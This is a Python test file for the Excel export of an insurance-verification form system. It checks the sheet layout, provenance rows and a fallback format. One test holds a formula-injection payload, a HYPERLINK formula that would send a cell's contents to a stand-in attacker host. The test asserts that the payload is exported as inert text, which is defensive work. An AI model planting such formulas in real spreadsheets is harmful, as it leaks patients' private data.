from datetime import UTC, datetime
from io import BytesIO
from uuid import uuid4

from openpyxl import load_workbook

from vera_core.forms.dsl import PromotedFields
from vera_core.forms.export import build_workbook
from vera_core.services.call_provenance import CallAttempt, FieldProvenance, JudgeInfo

V2 = {
    "dsl_version": "2.1",
    "name": "Test",
    "insurance_type": "infertility_treatment",
    # The DSL requires every promoted column mapped to a system_fields target —
    # point them all at one leaf (same shortcut as test_conditions.py).
    # "patient_information" is a LEFT_TOP placement key (export_form_sheet.py)
    # so the replica anchors it at A1.
    "system_fields": {
        "network_status": "sections.patient_information.network_status",
    },
    "rep_call_reference_number_field": "sections.patient_information.network_status",
    "promoted_fields": dict.fromkeys(
        PromotedFields.model_fields, "sections.patient_information.network_status"
    ),
    "sections": {
        "patient_information": {
            "title": "Patient Information",
            "role": "collect",
            "fields": {
                "network_status": {
                    "type": "text",
                    "title": "Network status",
                    "role": "ask",
                    "required": True,
                    "prompt": {"ask": "What is the network status?"},
                },
            },
        },
    },
    "tasks": [{"task_key": "t1", "title": "Task 1", "sections": ["patient_information"]}],
}


def _attempt(n: int, mode: str) -> CallAttempt:
    return CallAttempt(
        id=uuid4(),
        attempt=n,
        mode=mode,
        status="completed",
        created_at=datetime(2026, 7, 10, tzinfo=UTC),
        retry_of=None,
        changed_paths=[],
    )


def test_v2_form_sheet_is_ui_replica() -> None:
    """The v2 "Form" sheet is now export_form_sheet.render_form_sheet's UI
    replica, not the old flat bold-header/label-value walk — anchor on the
    replica's known geometry instead."""
    path = "sections.patient_information.network_status"
    data = build_workbook(
        V2,
        values={path: "in-network"},
        sources={path: "ai_call"},
        provenance={path: FieldProvenance(attempt=1, mode="full", judge=JudgeInfo(90, True, "e"))},
        attempts=[_attempt(1, "full")],
    )
    wb = load_workbook(BytesIO(data))
    assert wb.sheetnames == ["Form", "Provenance"]
    ws = wb["Form"]
    # LEFT_TOP section is anchored at A1 with a label/value pair below it.
    assert ws.cell(row=1, column=1).value == "Patient Information"
    assert ws.cell(row=2, column=1).value == "Network status *"
    assert ws.cell(row=2, column=2).value == "in-network"
    prov_rows = [tuple(r) for r in wb["Provenance"].iter_rows(values_only=True)]
    assert any(r[0] == path and r[2] == "ai_call" and r[3] == 1 for r in prov_rows if r[0])
    assert any(r and r[0] == "Call history" for r in prov_rows)


def test_v1_falls_back_to_flat_listing() -> None:
    data = build_workbook(
        {"sections": []},
        values={"cov.a": "x"},
        sources={"cov.a": "human"},
        provenance={},
        attempts=[],
    )
    wb = load_workbook(BytesIO(data))
    rows = [tuple(r) for r in wb["Form"].iter_rows(values_only=True)]
    assert ("cov.a", "x") in rows


def test_formula_shaped_values_export_as_inert_text() -> None:
    """A field value starting with "=" (attacker-influenceable: rep speech via
    LLM extraction, intake, human edits) must land in the PHI export as text,
    never a live Excel formula (exfiltration surface)."""
    payload = '=HYPERLINK("http://evil/?x="&B2,"click")'
    data = build_workbook(
        {"sections": []},
        values={"cov.a": payload},
        sources={"cov.a": "human"},
        provenance={},
        attempts=[],
    )
    wb = load_workbook(BytesIO(data))
    cell = next(c for row in wb["Form"].iter_rows() for c in row if c.value == payload)
    assert cell.data_type != "f"
    rows = [tuple(r) for r in wb["Form"].iter_rows(values_only=True)]
    assert ("cov.a", payload) in rows  # text preserved verbatim
